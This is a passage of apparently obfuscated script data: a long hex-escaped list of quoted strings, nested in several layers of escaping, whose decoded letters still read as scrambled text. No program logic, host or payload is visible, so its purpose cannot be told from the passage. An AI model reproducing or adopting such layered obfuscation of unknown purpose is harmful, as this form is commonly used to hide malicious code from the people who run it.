5c\x5c\x5c\x79\x22\x2c\x22\x5c\x5c\x5c\x5c\x64\x5c\x5c\x5c\x5c\x76\x5c\x5c\x5c\x5c\x46\x5c\x5c\x5c\x5c\x64\x5c\x5c\x5c\x5c\x63\x5c\x5c\x5c\x5c\x69\x22\x2c\x22\x5c\x5c\x5c\x5c\x6f\x5c\x5c\x5c\x5c\x69\x5c\x5c\x5c\x5c\x68\x5c\x5c\x5c\x5c\x6c\x5c\x5c\x5c\x5c\x65\x5c\x5c\x5c\x5c\x47\x22\x2c\x22\x5c\x5c\x5c\x5c\x69\x5c\x5c\x5c\x5c\x65\x5c\x5c\x5c\x5c\x6f\x5c\x5c\x5c\x5c\x6a\x5c\x5c\x5c\x5c\x62\x5c\x5c\x5c\x5c\x6c\x5c\x5c\x5c\x5c\x65\x22\x2c\x22\x5c\x5c\x5c\x5c\x73\x5c\x5c\x5c\x5c\x6d\x5c\x5c\x5c\x5c\x68\x5c\x5c\x5c\x5c\x7a\x5c\x5c\x5c\x5c\x6b\x5c\x5c\x5c\x5c\x6c\x5c\x5c\x5c\x5c\x6a\x5c\x5c\x5c\x5c\x62\x5c\x5c\x5c\x5c\x64\x5c\x5c\x5c\x5c\x64\x5c\x5c\x5c\x5c\x77\x5c\x5c\x5c\x5c\x72\x5c\x5c\x5c\x5c\x64\x5c\x5c\x5c\x5c\x66\x5c\x5c\x5c\x5c\x69\x5c\x5c\x5c\x5c\x62\x5c\x5c\x5c\x5c\x47\x5c\x5c\x5c\x5c\x6f\x5c\x5c\x5c\x5c\x69\x5c\x5c\x5c\x5c\x66\x5c\x5c\x5c\x5c\x6d\x5c\x5c\x5c\x5c\x76\x5c\x5c\x5c\x5c\x6c\x5c\x5c\x5c\x5c\x63\x5c\x5c\x5c\x5c\x47\x5c\x5c\x5c\x5c\x68\x5c\x5c\x5c\x5c\x63\x5c\x5c\x5c\x5c\x65\x5c\x5c\x5c\x5c\x71\x5c\x5c\x5c\x5c\x47\x5c\x5c\x5c\x5c\x6f\x5c\x5c\x5c\x5c\x69\x5c\x5c\x5c\x5c\x68\x5c\x5c\x5c\x5c\x6c\x5c\x5c\x5c\x5c\x65\x5c\x5c\x5c\x5c\x6b\x5c\x5c\x5c\x5c\x68\x5c\x5c\x5c\x5c\x63\x5c\x5c\x5c\x5c\x65\x5c\x5c\x5c\x5c\x71\x5c\x5c\x5c\x5c\x47\x5c\x5c\x5c\x5c\x6f\x5c\x5c\x5c\x5c\x69\x5c\x5c\x5c\x5c\x68\x5c\x5c\x5c\x5c\x6c\x5c\x5c\x5c\x5c\x65\x5c\x5c\x5c\x5c\x72\x5c\x5c\x5c\x5c\x74\x5c\x5c\x5c\x5c\x73\x5c\x5c\x5c\x5c\x64\x5c\x5c\x5c\x5c\x6f\x5c\x5c\x5c\x5c\x62\x5c\x5c\x5c\x5c\x6e\x5c\x5c\x5c\x5c\x6b\x5c\x5c\x5c\x5c\x6c\x5c\x5c\x5c\x5c\x6a\x5c\x5c\x5c\x5c\x62\x5c\x5c\x5c\x5c\x64\x5c\x5c\x5c\x5c\x64\x5c\x5c\x5c\x5c\x77\x5c\x5c\x5c\x5c\x72\x5c\x5c\x5c\x5c\x64\x5c\x5c\x5c\x5c\x66\x5c\x5c\x5c\x5c\x69\x5c\x5c\x5c\x5c\x62\x5c\x5c\x5c\x5c\x70\x5c\x5c\x5c\x5c\x6f\x5c\x5c\x5c\x5c\x69\x5c\x5c\x5c\x5c\x66\x5c\x5c\x5c\x5c\x6d\x5c\x5c\x5c\x5c\x76\x5c\x5c\x5c\x5c\x6c\x5c\x5c\x5c\x5c\x63\x5c\x5c\x5c\x5c\x70\x5c\x5c\x5c\x5c\x6f\x5c\x5c\x5c\x5c\x69\x5c\x5c\x5c\x5c\x68\x5c\x5c\x5c\x5c\x6c\x5c\x5c\x5c\x5c\x65\x5c\x5c\x5c\x5c\x70\x5c\x5c\x5c\x5c\x63\x5c\x5c\x5c\x5c\x65\x5c\x5c\x5c\x5c\x59\x5c\x5c\x5c\x5c\x63\x5c\x5c\x5c\x5c\x72\x5c\x5c\x5c\x5c\x74\x5c\x5c\x5c\x5c\x31\x6b\x5c\x5c\x5c\x5c\x69\x5c\x5c\x5c\x5c\x68\x5c\x5c\x5c\x5c\x6c\x5c\x5c\x5c\x5c\x65\x5c\x5c\x5c\x5c\x51\x5c\x5c\x5c\x5c\x73\x5c\x5c\x5c\x5c\x75\x5c\x5c\x5c\x5c\x64\x5c\x5c\x5c\x5c\x6f\x5c\x5c\x5c\x5c\x62\x5c\x5c\x5c\x5c\x6e\x5c\x5c\x5c\x5c\x74\x5c\x5c\x5c\x5c\x73\x5c\x5c\x5c\x5c\x64\x5c\x5c\x5c\x5c\x6f\x5c\x5c\x5c\x5c\x62\x5c\x5c\x5c\x5c\x6e\x5c\x5c\x5c\x5c\x6b\x5c\x5c\x5c\x5c\x6c\x5c\x5c\x5c\x5c\x6a\x5c\x5c\x5c\x5c\x62\x5c\x5c\x5c\x5c\x64\x5c\x5c\x5c\x5c\x64\x5c\x5c\x5c\x5c\x77\x5c\x5c\x5c\x5c\x72\x5c\x5c\x5c\x5c\x64\x5c\x5c\x5c\x5c\x66\x5c\x5c\x5c\x5c\x69\x5c\x5c\x5c\x5c\x62\x5c\x5c\x5c\x5c\x47\x5c\x5c\x5c\x5c\x6f\x5c\x5c\x5c\x5c\x69\x5c\x5c\x5c\x5c\x66\x5c\x5c\x5c\x5c\x6d\x5c\x5c\x5c\x5c\x76\x5c\x5c\x5c\x5c\x6c\x5c\x5c\x5c\x5c\x63\x5c\x5c\x5c\x5c\x47\x5c\x5c\x5c\x5c\x6f\x5c\x5c\x5c\x5c\x69\x5c\x5c\x5c\x5c\x68\x5c\x5c\x5c\x5c\x6c\x5c\x5c\x5c\x5c\x65\x5c\x5c\x5c\x5c\x72\x5c\x5c\x5c\x5c\x74\x22\x2c\x22\x5c\x5c\x5c\x5c\x73\x5c\x5c\x5c\x5c\x75\x5c\x5c\x5c\x5c\x64\x5c\x5c\x5c\x5c\x6f\x5c\x5c\x5c\x5c\x62\x5c\x5c\x5c\x5c\x6e\x5c\x5c\x5c\x5c\x74\x5c\x5c\x5c\x5c\x73\x5c\x5c\x5c\x5c\x75\x5c\x5c\x5c\x5c\x6d\x5c\x5c\x5c\x5c\x68\x5c\x5c\x5c\x5c\x7a\x5c\x5c\x5c\x5c\x74\x22\x2c\x22\x5c\x5c\x5c\x5c\x79\x5c\x5c\x5c\x5c\x63\x5c\x5c\x5c\x5c\x71\x5c\x5c\x5c\x5c\x6a\x22\x2c\x22\x5c\x5c\x5c\x5c\x6c\x5c\x5c\x5c\x5c\x66\x5c\x5c\x5c\x5c\x6e\x5c\x5c\x5c\x5c\x63\x5c\x5c\x5c\x5c\x65\x5c\x5c\x5c\x5c\x6e\x5c\x5c\x5c\x5c\x63\x5c\x5c\x5c\x5c\x64\x22\x2c\x22\x5c\x5c\x5c\x5c\x69\x5c\x5c\x5c\x5c\x65\x5c\x5c\x5c\x5c\x6f\x5c\x5c\x5c\x5c\x6a\x5c\x5c\x5c\x5c\x62\x5c\x5c\x5c\x5c\x6c\x5c\x5c\x5c\x5c\x65\x5c\x5c\x5c\x5c\x33\x79\x5c\x5c\x5c\x5c\x68\x5c\x5c\x5c\x5c\x63\x5c\x5c\x5c\x5c\x79\x22\x2c\x22\x5c\x5c\x5c\x5c\x41\x5c\x5c\x5c\x5c\x64\x5c\x5c\x5c\x5c\x66\x5c\x5c\x5c\x5c\x69\x5c\x5c\x5c\x5c\x62\x5c\x5c\x5c\x5c\x47\x5c\x5c\x5c\x5c\x6f\x5c\x5c\x5c\x5c\x69\x5c\x5c\x5c\x5c\x66\x5c\x5c\x5c\x5c\x6d\x5c\x5c\x5c\x5c\x76\x5c\x5c\x5c\x5c\x6c\x5c\x5c\x5c\x5c\x63\x5c\x5c\x5c\x5c\x47\x5c\x5c\x5c\x5c\x6a\x5c\x5c\x5c\x5c\x62\x5c\x5c\x5c\x5c\x46\x5c\x5c\x5c\x5c\x65\x5c\x5c\x5c\x5c\x6a\x5c\x5c\x5c\x5c\x47\x5c\x5c\x5c\x5c\x69\x5c\x5c\x5c\x5c\x65\x5c\x5c\x5c\x5c\x71\x5c\x5c\x5c\x5c\x66\x5c\x5c\x5c\x5c\x7a\x5c\x5c\x5c\x5c\x65\x22\x2c\x22\x5c\x5c\x5c\x5c\x6f\x5c\x5c\x5c\x5c\x62\x5c\x5c\x5c\x5c\x69\x5c\x5c\x5c\x5c\x65\x5c\x5c\x5c\x5c\x6e\x5c\x5c\x5c\x5c\x63\x22\x2c\x22\x5c\x5c\x5c\x5c\x41\x5c\x5c\x5c\x5c\x64\x5c\x5c\x5c\x5c\x66\x5c\x5c\x5c\x5c\x69\x5c\x5c\x5c\x5c\x62\x5c\x5c\x5c\x5c\x47\x5c\x5c\x5c\x5c\x6f\x5c\x5c\x5c\x5c\x69\x5c\x5c\x5c\x5c\x66\x5c\x5c\x5c\x5c\x6d\x5c\x5c\x5c\x5c\x76\x5c\x5c\x5c\x5c\x6c\x5c\x5c\x5c\x5c\x63\x5c\x5c\x5c\x5c\x47\x5c\x5c\x5c\x5c\x68\x5c\x5c\x5c\x5c\x63\x5c\x5c\x5c\x5c\x65\x5c\x5c\x5c\x5c\x71\x5c\x5c\x5c\x5c\x47\x5c\x5c\x5c\x5c\x6f\x5c\x5c\x5c\x5c\x69\x5c\x5c\x5c\x5c\x68\x5c\x5c\x5c\x5c\x6c\x5c\x5c\x5c\x5c\x65\x22\x2c\x22\x5c\x5c\x5c\x5c\x41\x5c\x5c\x5c\x5c\x64\x5c\x5c\x5c\x5c\x66\x5c\x5c\x5c\x5c\x69\x5c\x5c\x5c\x5c\x62\x5c\x5c\x5c\x5c\x47\x5c\x5c\x5c\x5c\x6f\x5c\x5c\x5c\x5c\x69\x5c\x5c\x5c\x5c\x66\x5c\x5c\x5c\x5c\x6d\x5c\x5c\x5c\x5c\x76\x5c\x5c\x5c\x5c\x6c\x5c\x5c\x5c\x5c\x63\x5c\x5c\x5c\x5c\x47\x5c\x5c\x5c\x5c\x6f\x5c\x5c\x5c\x5c\x69\x5c\x5c\x5c\x5c\x68\x5c\x5c\x5c\x5c\x6c\x5c\x5c\x5c\x5c\x65\x5c\x5c\x5c\x5c\x47\x5c\x5c\x5c\x5c\x69\x5c\x5c\x5c\x5c\x65\x5c\x5c\x5c\x5c\x71\x5c\x5c\x5c\x5c\x66\x5c\x5c\x5c\x5c\x7a\x5c\x5c\x5c\x5c\x65\x22\x2c\x22\x5c\x5c\x5c\x5c\x65\x5c\x5c\x5c\x5c\x62\x5c\x5c\x5c\x5c\x6c\x5c\x5c\x5c\x5c\x79\x22\x2c\x22\x5c\x5c\x5c\x5c\x41\x5c\x5c\x5c\x5c\x64\x5c\x5c\x5c\x5c\x66\x5c\x5c\x5c\x5c\x69\x5c\x5c\x5c\x5c\x62\x5c\x5c\x5c\x5c\x47\x5c\x5c\x5c\x5c\x6f\x5c\x5c\x5c\x5c\x69\x5c\x5c\x5c\x5c\x66\x5c\x5c\x5c\x5c\x6d\x5c\x5c\x5c\x5c\x76\x5c\x5c\x5c\x5c\x6c\x5c\x5c\x5c\x5c\x63\x5c\x5c\x5c\x5c\x47\x5c\x5c\x5c\x5c\x6f\x5c\x5c\x5c\x5c\x69\x5c\x5c\x5c\x5c\x68\x5c\x5c\x5c\x5c\x6c\x5c\x5c\x5c\x5c\x65\x5c\x5c\x5c\x5c\x47\x5c\x5c\x5c\x5c\x69\x5c\x5c\x5c\x5c\x65\x5c\x5c\x5c\x5c\x71\x5c\x5c\x5c\x5c\x66\x5c\x5c\x5c\x5c\x7a\x5c\x5c\x5c\x5c\x65\x5c\x5c\x5c\x5c\x6b\x5c\x5c\x5c\x5c\x41\x5c\x5c\x5c\x5c\x64\x5c\x5c\x5c\x5c\x66\x5c\x5c\x5c\x5c\x69\x5c\x5c\x5c\x5c\x62\x5c\x5c\x5c\x5c\x47\x5c\x5c\x5c\x5c\x6f\x5c\x5c\x5c\x5c\x69\x5c\x5c\x5c\x5c\x66\x5c\x5c\x5c\x5c\x6d\x5c\x5c\x5c\x5c\x76\x5c\x5c\x5c\x5c\x6c\x5c\x5c\x5c\x5c\x63\x5c\x5c\x5c\x5c\x47\x5c\x5c\x5c\x5c\x6a\x5c\x5c\x5c\x5c\x62\x5c\x5c\x5c\x5c\x46\x5c\x5c\x5c\x5c\x65\x5c\x5c\x5c\x5c\x6a\x5c\x5c\x5c\x5c\x47\x5c\x5c\x5c\x5c\x69\x5c\x5c\x5c\x5c\x65\x5c\x5c\x5c\x5c\x71\x5c\x5c\x5c\x5c\x66\x5c\x5c\x5c\x5c\x7a\x5c\x5c\x5c\x5c\x65\x22\x2c\x22\x5c\x5c\x5c\x5c\x73\x5c\x5c\x5c\x5c\x64\x5c\x5c\x5c\x5c\x6f\x5c\x5c\x5c\x5c\x62\x5c\x5c\x5c\x5c\x6e\x5c\x5c\x5c\x5c\x6b\x5c\x5c\x5c\x5c\x6c\x5c\x5c\x5c\x5c\x6a\x5c\x5c\x5c\x5c\x62\x5c\x5c\x5c\x5c\x64\x5c\x5c\x5c\x5c\x64\x5c\x5c\x5c\x5c\x77\x5c\x5c\x5c\x5c\x72\x5c\x5c\x5c\x5c\x64\x5c\x5c\x5c\x5c\x66\x5c\x5c\x5c\x5c\x69\x5c\x5c\x5c\x5c\x62\x5c\x5c\x5c\x5c\x47\x5c\x5c\x5c\x5c\x6f\x5c\x5c\x5c\x5c\x69\x5c\x5c\x5c\x5c\x66\x5c\x5c\x5c\x5c\x6d\x5c\x5c\x5c\x5c\x76\x5c\x5c\x5c\x5c\x6c\x5c\x5c\x5c\x5c\x63\x5c\x5c\x5c\x5c\x47\x5c\x5c\x5c\x5c\x63\x5c\x5c\x5c\x5c\x62\x5c\x5c\x5c\x5c\x42\x5c\x5c\x5c\x5c\x47\x5c\x5c\x5c\x5c\x69\x5c\x5c\x5c\x5c\x65\x5c\x5c\x5c\x5c\x71\x5c\x5c\x5c\x5c\x66\x5c\x5c\x5c\x5c\x7a\x5c\x5c\x5c\x5c\x65\x5c\x5c\x5c\x5c\x72\x5c\x5c\x5c\x5c\x74\x22\x2c\x22\x5c\x5c\x5c\x5c\x73\x5c\x5c\x5c\x5c\x75\x5c\x5c\x5c\x5c\x64\x5c\x5c\x5c\x5c\x6f\x5c\x5c\x5c\x5c\x62\x5c\x5c\x5c\x5c\x6e\x5c\x5c\x5c\x5c\x74\x22\x2c\x22\x5c\x5c\x5c\x5c\x62\x22\x2c\x22\x5c\x5c\x5c\x5c\x44\x5c\x5c\x5c\x5c\x68\x5c\x5c\x5c\x5c\x6e\x5c\x5c\x5c\x5c\x6d\x22\x2c\x22\x5c\x5c\x5c\x5c\x69\x5c\x5c\x5c\x5c\x65\x5c\x5c\x5c\x5c\x71\x5c\x5c\x5c\x5c\x66\x5c\x5c\x5c\x5c\x7a\x5c\x5c\x5c\x5c\x65\x22\x2c\x22\x5c\x5c\x5c\x5c\x64\x5c\x5c\x5c\x5c\x6f\x5c\x5c\x5c\x5c\x62\x5c\x5c\x5c\x5c\x6e\x5c\x5c\x5c\x5c\x41\x5c\x5c\x5c\x5c\x6a\x5c\x5c\x5c\x5c\x62\x5c\x5c\x5c\x5c\x46\x5c\x5c\x5c\x5c\x65\x5c\x5c\x5c\x5c\x6a\x5c\x5c\x5c\x5c\x70\x5c\x5c\x5c\x5c\x64\x5c\x5c\x5c\x5c\x68\x5c\x5c\x5c\x5c\x31\x4d\x5c\x5c\x5c\x5c\x65\x22\x2c\x22\x5c\x5c\x5c\x5c\x41\x5c\x5c\x5c\x5c\x64\x5c\x5c\x5c\x5c\x66\x5c\x5c\x5c\x5c\x69\x5c\x5c\x5c\x5c\x62\x5c\x5c\x5c\x5c\x47\x5c\x5c\x5c\x5c\x6f\x5c\x5c\x5c\x5c\x69\x5c\x5c\x5c\x5c\x66\x5c\x5c\x5c\x5c\x6d\x5c\x5c\x5c\x5c\x76\x5c\x5c\x5c\x5c\x6c\x5c\x5c\x5c\x5c\x63\x5c\x5c\x5c\x5c\x47\x5c\x5c\x5c\x5c\x63\x5c\x5c\x5c\x5c\x62\x5c\x5c\x5c\x5c\x42\x5c\x5c\x5c\x5c\x47\x5c\x5c\x5c\x5c\x69\x5c\x5c\x5c\x5c\x65\x5c\x5c\x5c\x5c\x71\x5c\x5c\x5c\x5c\x66\x5c\x5c\x5c\x5c\x7a\x5c\x5c\x5c\x5c\x65\x22\x2c\x22\x5c\x5c\x5c\x5c\x41\x5c\x5c\x5c\x5c\x48\x5c\x5c\x5c\x5c\x68\x5c\x5c\x5c\x5c\x6d\x5c\x5c\x5c\x5c\x42\x5c\x5c\x5c\x5c\x65\x5c\x5c\x5c\x5c\x63\x5c\x5c\x5c\x5c\x41\x5c\x5c\x5c\x5c\x31\x42\x5c\x5c\x5c\x5c\x62\x5c\x5c\x5c\x5c\x46\x5c\x5c\x5c\x5c\x65\x5c\x5c\x5c\x5c\x6a\x5c\x5c\x5c\x5c\x6b\x5c\x5c\x5c\x5c\x64\x5c\x5c\x5c\x5c\x6f\x5c\x5c\x5c\x5c\x62\x5c\x5c\x5c\x5c\x6e\x5c\x5c\x5c\x5c\x41\x5c\x5c\x5c\x5c\x6a\x5c\x5c\x5c\x5c\x62\x5c\x5c\x5c\x5c\x46\x5c\x5c\x5c\x5c\x65\x5c\x5c\x5c\x5c\x6a\x5c\x5c\x5c\x5c\x70\x5c\x5c\x5c\x5c\x64\x5c\x5c\x5c\x5c\x68\x5c\x5c\x5c\x5c\x31\x4d\x5c\x5c\x5c\x5c\x65\x22\x2c\x22\x5c\x5c\x5c\x5c\x6a\x5c\x5c\x5c\x5c\x68\x22\x2c\x22\x5c\x5c\x5c\x5c\x41\x5c\x5c\x5c\x5c\x48\x5c\x5c\x5c\x5c\x68\x5c\x5c\x5c\x5c\x6d\x5c\x5c\x5c\x5c\x42\x5c\x5c\x5c\x5c\x65\x5c\x5c\x5c\x5c\x63\x5c\x5c\x5c\x5c\x41\x5c\x5c\x5c\x5c\x31\x42\x5c\x5c\x5c\x5c\x62\x5c\x5c\x5c\x5c\x46\x5c\x5c\x5c\x5c\x65\x5c\x5c\x5c\x5c\x6a\x5c\x5c\x5c\x5c\x6b\x5c\x5c\x5c\x5c\x62\x22\x2c\x22\x5c\x5c\x5c\x5c\x69\x5c\x5c\x5c\x5c\x65\x5c\x5c\x5c\x5c\x62\x5c\x5c\x5c\x5c\x6d\x5c\x5c\x5c\x5c\x4d\x22\x2c\x22\x5c\x5c\x5c\x5c\x66\x5c\x5c\x5c\x5c\x44\x5c\x5c\x5c\x5c\x44\x22\x2c\x22\x5c\x5c\x5c\x5c\x66\x5c\x5c\x5c\x5c\x44\x5c\x5c\x5c\x5c\x44\x5c\x5c\x5c\x5c\x34\x78\x22\x2c\x22\x5c\x5c\x5c\x5c\x73\x5c\x5c\x5c\x5c\x6d\x5c\x5c\x5c\x5c\x68\x5c\x5c\x5c\x5c\x7a\x5c\x5c\x5c\x5c\x6b\x5c\x5c\x5c\x5c\x6c\x5c\x5c\x5c\x5c\x6a\x5c\x5c\x5c\x5c\x62\x5c\x5c\x5c\x5c\x64\x5c\x5c\x5c\x5c\x64\x5c\x5c\x5c\x5c\x77\x5c\x5c\x5c\x5c\x72\x5c\x5c\x5c\x5c\x64\x5c\x5c\x5c\x5c\x66\x5c\x5c\x5c\x5c\x69\x5c\x5c\x5c\x5c\x62\x5c\x5c\x5c\x5c\x47\x5c\x5c\x5c\x5c\x6f\x5c\x5c\x5c\x5c\x69\x5c\x5c\x5c\x5c\x66\x5c\x5c\x5c\x5c\x6d\x5c\x5c\x5c\x5c\x76\x5c\x5c\x5c\x5c\x6c\x5c\x5c\x5c\x5c\x63\x5c\x5c\x5c\x5c\x47\x5c\x5c\x5c\x5c\x68\x5c\x5c\x5c\x5c\x63\x5c\x5c\x5c\x5c\x65\x5c\x5c\x5c\x5c\x71\x5c\x5c\x5c\x5c\x47\x5c\x5c\x5c\x5c\x6d\x5c\x5c\x5c\x5c\x68\x5c\x5c\x5c\x5c\x64\x5c\x5c\x5c\x5c\x72\x5c\x5c\x5c\x5c\x74\x5c\x5c\x5c\x5c\x73\x5c\x5c\x5c\x5c\x64\x5c\x5c\x5c\x5c\x6f\x5c\x5c\x5c\x5c\x62\x5c\x5c\x5c\x5c\x6e\x5c\x5c\x5c\x5c\x6b\x5c\x5c\x5c\x5c\x6c\x5c\x5c\x5c\x5c\x6a\x5c\x5c\x5c\x5c\x62\x5c\x5c\x5c\x5c\x64\x5c\x5c\x5c\x5c\x64\x5c\x5c\x5c\x5c\x77\x5c\x5c\x5c\x5c\x72\x5c\x5c\x5c\x5c\x64\x5c\x5c\x5c\x5c\x66\x5c\x5c\x5c\x5c\x69\x5c\x5c\x5c\x5c\x62\x5c\x5c\x5c\x5c\x47\x5c\x5c\x5c\x5c\x6f\x5c\x5c\x5c\x5c\x69\x5c\x5c\x5c\x5c\x66\x5c\x5c\x5c\x5c\x6d\x5c\x5c\x5c\x5c\x76\x5c\x5c\x5c\x5c\x6c\x5c\x5c\x5c\x5c\x63\x5c\x5c\x5c\x5c\x47\x5c\x5c\x5c\x5c\x6d\x5c\x5c\x5c\x5c\x68\x5c\x5c\x5c\x5c\x64\x5c\x5c\x5c\x5c\x72\x5c\x5c\x5c\x5c\x74\x22\x2c\x22\x5c\x5c\x5c\x5c\x41\x5c\x5c\x5c\x5c\x64\x5c\x5c\x5c\x5c\x66\x5c\x5c\x5c\x5c\x69\x5c\x5c\x5c\x5c\x62\x5c\x5c\x5c\x5c\x47\x5c\x5c\x5c\x5c\x6f\x5c\x5c\x5c\x5c\x69\x5c\x5c\x5c\x5c\x66\x5c\x5c\x5c\x5c\x6d\x5c\x5c\x5c\x5c\x76\x5c\x5c\x5c\x5c\x6c\x5c\x5c\x5c\x5c\x63\x5c\x5c\x5c\x5c\x47\x5c\x5c\x5c\x5c\x6d\x5c\x5c\x5c\x5c\x68\x5c\x5c\x5c\x5c\x64\x5c\x5c\x5c\x5c\x47\x5c\x5c\x5c\x5c\x6a\x5c\x5c\x5c\x5c\x62\x5c\x5c\x5c\x5c\x46\x5c\x5c\x5c\x5c\x65\x5c\x5c\x5c\x5c\x6a\x5c\x5c\x5c\x5c\x47\x5c\x5c\x5c\x5c\x69\x5c\x5c\x5c\x5c\x65\x5c\x5c\x5c\x5c\x71\x5c\x5c\x5c\x5c\x66\x5c\x5c\x5c\x5c\x7a\x5c\x5c\x5c\x5c\x65\x22\x2c\x22\x5c\x5c\x5c\x5c\x41\x5c\x5c\x5c\x5c\x64\x5c\x5c\x5c\x5c\x66\x5c\x5c\x5c\x5c\x69\x5c\x5c\x5c\x5c\x62\x5c\x5c\x5c\x5c\x47\x5c\x5c\x5c\x5c\x6f\x5c\x5c\x5c\x5c\x69\x5c\x5c\x5c\x5c\x66\x5c\x5c\x5c\x5c\x6d\x5c\x5c\x5c\x5c\x76\x5c\x5c\x5c\x5c\x6c\x5c\x5c\x5c\x5c\x63\x5c\x5c\x5c\x5c\x47\x5c\x5c\x5c\x5c\x68\x5c\x5c\x5c\x5c\x63\x5c\x5c\x5c\x5c\x65\x5c\x5c\x5c\x5c\x71\x5c\x5c\x5c\x5c\x47\x5c\x5c\x5c\x5c\x6d\x5c\x5c\x5c\x5c\x68\x5c\x5c\x5c\x5c\x64\x22\x2c\x22\x5c\x5c\x5c\x5c\x41\x5c\x5c\x5c\x5c\x64\x5c\x5c\x5c\x5c\x66\x5c\x5c\x5c\x5c\x69\x5c\x5c\x5c\x5c\x62\x5c\x5c\x5c\x5c\x47\x5c\x5c\x5c\x5c\x6f\x5c\x5c\x5c\x5c\x69\x5c\x5c\x5c\x5c\x66\x5c\x5c\x5c\x5c\x6d\x5c\x5c\x5c\x5c\x76\x5c\x5c\x5c\x5c\x6c\x5c\x5c\x5c\x5c\x63\x5c\x5c\x5c\x5c\x47\x5c\x5c\x5c\x5c\x6d\x5c\x5c\x5c\x5c\x68\x5c\x5c\x5c\x5c\x64\x5c\x5c\x5c\x5c\x47\x5c\x5c\x5c\x5c\x69\x5c\x5c\x5c\x5c\x65\x5c\x5c\x5c\x5c\x71\x5c\x5c\x5c\x5c\x66\x5c\x5c\x5c\x5c\x7a\x5c\x5c\x5c\x5c\x65\x22\x2c\x22\x5c\x5c\x5c\x5c\x41\x5c\x5c\x5c\x5c\x64\x5c\x5c\x5c\x5c\x66\x5c\x5c\x5c\x5c\x69\x5c\x5c\x5c\x5c\x62\x5c\x5c\x5c\x5c\x47\x5c\x5c\x5c\x5c\x6f\x5c\x5c\x5c\x5c\x69\x5c\x5c\x5c\x5c\x66\x5c\x5c\x5c\x5c\x6d\x5c\x5c\x5c\x5c\x76\x5c\x5c\x5c\x5c\x6c\x5c\x5c\x5c\x5c\x63\x5c\x5c\x5c\x5c\x47\x5c\x5c\x5c\x5c\x6d\x5c\x5c\x5c\x5c\x68\x5c\x5c\x5c\x5c\x64\x5c\x5c\x5c\x5c\x47\x5c\x5c\x5c\x5c\x69\x5c\x5c\x5c\x5c\x65\x5c\x5c\x5c\x5c\x71\x5c\x5c\x5c\x5c\x66\x5c\x5c\x5c\x5c\x7a\x5c\x5c\x5c\x5c\x65\x5c\x5c\x5c\x5c\x6b\x5c\x5c\x5c\x5c\x41\x5c\x5c\x5c\x5c\x64\x5c\x5c\x5c\x5c\x66\x5c\x5c\x5c\x5c\x69\x5c\x5c\x5c\x5c\x62\x5c\x5c\x5c\x5c\x47\x5c\x5c\x5c\x5c\x6f\x5c\x5c\x5c\x5c\x69\x5c\x5c\x5c\x5c\x66\x5c\x5c\x5c\x5c\x6d\x5c\x5c\x5c\x5c\x76\x5c\x5c\x5c\x5c\x6c\x5c\x5c\x5c\x5c\x63\x5c\x5c\x5c\x5c\x47\x5c\x5c\x5c\x5c\x6d\x5c\x5c\x5c\x5c\x68\x5c\x5c\x5c\x5c\x64\x5c\x5c\x5c\x5c\x47\x5c\x5c\x5c\x5c\x6a\x5c\x5c\x5c\x5c\x62\x5c\x5c\x5c\x5c\x46\x5c\x5c\x5c\x5c\x65\x5c\x5c\x5c\x5c\x6a\x5c\x5c\x5c\x5c\x47\x5c\x5c\x5c\x5c\x69\x5c\x5c\x5c\x5c\x65\x5c\x5c\x5c\x5c\x71\x5c\x5c\x5c\x5c\x66\x5c\x5c\x5c\x5c\x7a\x5c\x5c\x5c\x5c\x65\x22\x2c\x22\x5c\x5c\x5c\x5c\x73\x5c\x5c\x5c\x5c\x64\x5c\x5c\x5c\x5c\x6f\x5c\x5c\x5c\x5c\x62\x5c\x5c\x5c\x5c\x6e\x5c\x5c\x5c\x5c\x6b\x5c\x5c\x5c\x5c\x6c\x5c\x5c\x5c\x5c\x6a\x5c\x5c\x5c\x5c\x62\x5c\x5c\x5c\x5c\x64\x5c\x5c\x5c\x5c\x64\x5c\x5c\x5c\x5c\x77\x5c\x5c\x5c\x5c\x72\x5c\x5c\x5c\x5c\x64\x5c\x5c\x5c\x5c\x66\x5c\x5c\x5c\x5c\x69\x5c\x5c\x5c\x5c\x62\x5c\x5c\x5c\x5c\x47\x5c\x5c\x5c\x5c\x6f\x5c\x5c\x5c\x5c\x69\x5c\x5c\x5c\x5c\x66\x5c\x5c\x5c\x5c\x6d\x5c\x5c\x5c\x5c\x76\x5c\x5c\x5c\x5c\x6c\x5c\x5c\x5c\x5c\x63\x5c\x5c\x5c\x5c\x47\x5c\x5c\x5c\x5c\x6d\x5c\x5c\x5c\x5c\x68\x5c\x5c\x5c\x5c\x64\x5c\x5c\x5c\x5c\x47\x5c\x5c\x5c\x5c\x63\x5c\x5c\x5c\x5c\x62\x5c\x5c\x5c\x5c\x42\x5c\x5c\x5c\x5c\x47\x5c\x5c\x5c\x5c\x69\x5c\x5c\x5c\x5c\x65\x5c\x5c\x5c\x5c\x71\x5c\x5c\x5c\x5c\x66\x5c\x5c\x5c\x5c\x7a\x5c\x5c\x5c\x5c\x65\x5c\x5c\x5c\x5c\x72\x5c\x5c\x5c\x5c\x74\x22\x2c\x22\x5c\x5c\x5c\x5c\x41\x5c\x5c\x5c\x5c\x64\x5c\x5c\x5c\x5c\x66\x5c\x5c\x5c\x5c\x69\x5c\x5c\x5c\x5c\x62\x5c\x5c\x5c\x5c\x47\x5c\x5c\x5c\x5c\x6f\x5c\x5c\x5c\x5c\x69\x5c\x5c\x5c\x5c\x66\x5c\x5c\x5c\x5c\x6d\x5c\x5c\x5c\x5c\x76\x5c\x5c\x5c\x5c\x6c\x5c\x5c\x5c\x5c\x63\x5c\x5c\x5c\x5c\x47\x5c\x5c\x5c\x5c\x6d\x5c\x5c\x5c\x5c\x68\x5c\x5c\x5c\x5c\x64\x5c\x5c\x5c\x5c\x47\x5c\x5c\x5c\x5c\x63\x5c\x5c\x5c\x5c\x62\x5c\x5c\x5c\x5c\x42\x5c\x5c\x5c\x5c\x47\x5c\x5c\x5c\x5c\x69\x5c\x5c\x5c\x5c\x65\x5c\x5c\x5c\x5c\x71\x5c\x5c\x5c\x5c\x66\x5c\x5c\x5c\x5c\x7a\x5c\x5c\x5c\x5c\x65\x22\x2c\x22\x5c\x5c\x5c\x5c\x6f\x5c\x5c\x5c\x5c\x69\x5c\x5c\x5c\x5c\x66\x5c\x5c\x5c\x5c\x6d\x5c\x5c\x5c\x5c\x76\x5c\x5c\x5c\x5c\x6c\x5c\x5c\x5c\x5c\x63\x5c\x5c\x5c\x5c\x62\x5c\x5c\x5c\x5c\x6d\x22\x2c\x22\x5c\x5c\x5c\x5c\x63\x5c\x5c\x5c\x5c\x66\x5c\x5c\x5c\x5c\x42\x5c\x5c\x5c\x5